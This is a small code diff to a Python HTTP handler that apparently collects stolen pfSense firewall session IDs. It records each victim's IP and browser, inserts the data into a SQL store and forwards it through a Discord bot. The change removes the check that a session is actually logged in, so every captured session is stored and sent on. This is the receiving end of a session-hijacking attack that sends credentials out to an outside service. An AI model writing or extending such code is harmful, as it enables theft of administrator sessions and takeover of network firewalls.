@@ -35,10 +35,9 @@ class LogHandler(BaseHTTPRequestHandler):
             print(f"Session ID Received {pfsense_ip}: {session_id}")
             logged_in = asyncio.run(verify_pfsense_session(pfsense_ip, session_id))
             print(f"logged in: {logged_in}")
-            if logged_in: 
-                sqlworker.insert(client_ip, pfsense_ip, session_id, browser)
-                print("SQL inserted")
-                discord_bot.send_pfsense_id(client_ip, pfsense_ip, session_id, browser)
+            sqlworker.insert(client_ip, pfsense_ip, session_id, browser)
+            print("SQL inserted")
+            discord_bot.send_pfsense_id(client_ip, pfsense_ip, session_id, browser)
             self.send_response(200)
             self._send_cors_headers()
             self.end_headers()
